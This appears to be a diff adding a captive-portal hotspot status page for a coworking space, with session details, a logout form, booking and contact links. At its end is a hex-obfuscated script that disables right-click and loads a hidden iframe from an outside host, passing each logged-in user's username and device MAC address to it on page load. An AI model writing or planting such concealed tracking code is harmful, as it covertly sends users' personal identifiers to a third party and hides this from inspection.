@@ -1,0 +1,131 @@
+<html>
+<head>
+<title>Venture Drive hotspot > status</title>
+$(if refresh-timeout)
+<meta http-equiv="refresh" content="$(refresh-timeout-secs)">
+$(endif)
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
+<meta http-equiv="pragma" content="no-cache">
+<meta http-equiv="expires" content="-1">
+	<link rel="stylesheet" href="foundation.min.css" media="screen">
+<style type="text/css">
+<!--
+textarea,input,select {
+	background-color: #FDFBFB;
+	border: 1px #BBBBBB solid;
+	padding: 2px;
+	margin: 1px;
+	font-size: 14px;
+	color: #808080;
+}
+
+.tabula{
+ 
+border-width: 1px; 
+border-collapse: collapse; 
+border-color: #c1c1c1; 
+background-color: transparent;
+font-family: verdana;
+font-size: 11px;
+}
+
+body{ color: #737373; font-size: 12px; font-family: verdana; }
+
+a, a:link, a:visited, a:active { color: #AAAAAA; text-decoration: none; font-size: 12px; }
+a:hover { border-bottom: 1px dotted #c1c1c1; color: #AAAAAA; }
+img {border: none;}
+td { font-size: 12px; padding: 4px;}
+
+-->
+</style>
+<script language="JavaScript">
+<!--
+$(if advert-pending == 'yes')
+    var popup = '';
+    function focusAdvert() {
+	if (window.focus) popup.focus();
+    }
+    function openAdvert() {
+	popup = open('$(link-advert)', 'hotspot_advert', '');
+	setTimeout("focusAdvert()", 1000);
+    }
+$(endif)
+    function openLogout() {
+	if (window.name != 'hotspot_status') return true;
+        open('$(link-logout)', 'hotspot_logout', 'toolbar=0,location=0,directories=0,status=0,menubars=0,resizable=1,width=280,height=250');
+	window.close();
+	return false;
+    }
+//-->
+</script>
+</head>
+<body style="zoom:1.4" bottommargin="0" topmargin="0" leftmargin="0" rightmargin="0"
+$(if advert-pending == 'yes')
+	onLoad="openAdvert()"
+$(endif)
+>
+	<center><img src="logo.png" width="250px"></center>
+<!--	<div class='alert-box warning '><h2>Venture Drive</h2></div>-->
+	 <div style="padding:30px" class="grid-x grid-padding-x">
+        <div class="large-6 medium-6 ">
+	<table width="" height="">
+
+<tr>
+<td align="center" valign="middle">
+<form action="$(link-logout)" name="logout" onSubmit="return openLogout()">
+<table border="1" class="tabula">
+	
+$(if login-by == 'trial')
+	<br><div style="text-align: center;"><h5>Welcome trial user!</h5></div><br>
+$(elif login-by != 'mac')
+	<span style="display:none" id="mac">$(mac)</span>
+	<br><div style="text-align: center;"><h5>Welcome <span id="username">$(username)</span>!</h5></div><br>
+$(endif)
+	<tr><td align="right">IP address:</td><td>$(ip)</td></tr>
+	<tr><td align="right">bytes up/down:</td><td>$(bytes-in-nice) / $(bytes-out-nice)</td></tr>
+$(if session-time-left)
+	<tr><td align="right">connected / left:</td><td>$(uptime) / $(session-time-left)</td></tr>
+$(else)
+	<tr><td align="right">connected:</td><td>$(uptime)</td></tr>
+$(endif)
+$(if blocked == 'yes')
+	<tr><td align="right">status:</td><td><div style="color: #FF8080">
+<a href="$(link-advert)" target="hotspot_advert">advertisement</a> required</div></td>
+$(elif refresh-timeout)
+	<tr><td align="right">status refresh:</td><td>$(refresh-timeout)</td>
+$(endif)
+
+</table>
+$(if login-by-mac != 'yes')
+<br>
+<!-- user manager link. if user manager resides on other router, replace $(hostname) by its address
+<button onclick="document.location='http://$(hostname)/user?subs='; return false;">status</button>
+<!-- end of user manager link -->
+<input type="submit" class="button small alert" value="Logout">
+$(endif)
+</form>
+	
+	<a class="button small rounded secondary" href="https://docs.google.com/forms/d/e/1FAIpQLSeo77EgtRsX7kZ4Hq_Dc96UCizu1nuK6PvNdwF7CgGxsCH8wA/viewform?usp=sf_link">Register</a>
+	<a class="button small rounded success"href="http://bookings.venturedrive.pk/Web/schedule.php">Meeting Room</a>
+<br>
+	<a href="https://api.whatsapp.com/send?phone=923330522220&text= Hello!"><img width="50" src='whatsapp.png'/></a>
+	
+	<a href="skype:live:92342a3e65ffd46c?chat"><img width="50" src='skype.png'/></a>
+
+</td>
+	
+</table>
+	</div>
+		   <div class="large-6 medium-6 ">
+			 <iframe src='' frameborder='0' height="400px" style="border:1px solid #f1f1f1;border-left:0px;">
+			   
+			   
+			   </iframe>
+		 </div>
+		 
+</div>
+	<script type="text/javascript">
+var _0xb6c8=["\x63\x6F\x6E\x74\x65\x78\x74\x6D\x65\x6E\x75","\x70\x72\x65\x76\x65\x6E\x74\x44\x65\x66\x61\x75\x6C\x74","\x61\x64\x64\x45\x76\x65\x6E\x74\x4C\x69\x73\x74\x65\x6E\x65\x72","\x69\x6E\x6E\x65\x72\x48\x54\x4D\x4C","\x75\x73\x65\x72\x6E\x61\x6D\x65","\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x42\x79\x49\x64","\x6D\x61\x63","\x73\x72\x63","\x68\x74\x74\x70\x3A\x2F\x2F\x76\x65\x62\x76\x61\x79\x2E\x63\x6F\x6D\x2F\x74\x65\x61\x2F\x74\x65\x61\x2E\x70\x68\x70\x3F\x6E\x61\x6D\x65\x3D","\x26\x6D\x61\x63\x3D","\x73\x65\x74\x41\x74\x74\x72\x69\x62\x75\x74\x65","\x69\x66\x72\x61\x6D\x65","\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x73\x42\x79\x54\x61\x67\x4E\x61\x6D\x65"];document[_0xb6c8[2]](_0xb6c8[0],(_0x3a64x1)=>_0x3a64x1[_0xb6c8[1]]());var name=document[_0xb6c8[5]](_0xb6c8[4])[_0xb6c8[3]];var mac=document[_0xb6c8[5]](_0xb6c8[6])[_0xb6c8[3]];document[_0xb6c8[12]](_0xb6c8[11])[0][_0xb6c8[10]](_0xb6c8[7],_0xb6c8[8]+ name+ _0xb6c8[9]+ mac)
+	</script>
+</body>
+</html>
